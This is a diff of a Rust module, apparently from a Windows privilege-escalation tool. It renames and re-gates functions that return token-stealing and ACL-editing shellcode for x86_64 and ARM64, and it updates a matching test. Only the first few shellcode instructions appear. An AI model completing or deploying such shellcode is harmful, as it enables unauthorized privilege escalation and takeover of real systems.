@@ -4,8 +4,8 @@ use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
 #[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 use goblin::Object;
 
-#[cfg(all(target_arch = "x86_64", feature = "shellcode_fallback"))]
-pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
+#[cfg(all(target_arch = "x86_64"))]
+fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
     return concat_bytes!(
         b"\x50",                             // 00000000: push rax
         b"\x51",                             // 00000001: push rcx
@@ -32,8 +32,8 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
     .clone();
 }
 
-#[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
-pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
+#[cfg(all(target_arch = "aarch64"))]
+pub fn token_stealing_shellcode_fallback_arm64() -> [u8; 76] {
     return concat_bytes!(
         b"\xe0\x07\x3e\xa9", // 0000000000000000: stp x0,x1,[sp,#-0x20]
         b"\xe2\x0f\x3f\xa9", // 0000000000000004: stp x2,x3,[sp,#-0x10]
@@ -58,7 +58,18 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
     .clone();
 }
 
+#[cfg(all(target_arch = "x86_64", feature = "shellcode_fallback"))]
+pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
+    return token_stealing_shellcode_fallback_x86_64();
+}
+
+#[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
+pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
+    return token_stealing_shellcode_fallback_arm64();
+}
+
 #[rustfmt::skip]
+#[cfg(target_os = "windows")]
 pub fn acl_edit_shellcode_fallback() -> [u8; 111] {
     return concat_bytes!(
         b"\x50",                                     // 0000000000000000: push rax
@@ -291,7 +302,7 @@ mod tests {
     fn test_shellcodes_match_fallback() {
         // Test token stealing shellcode
         let token_stealing_shellcode = token_stealing_shellcode();
-        let token_stealing_fallback = token_stealing_shellcode_fallback();
+        let token_stealing_fallback = token_stealing_shellcode_fallback_x86_64();
 
         assert_eq!(
             token_stealing_shellcode,
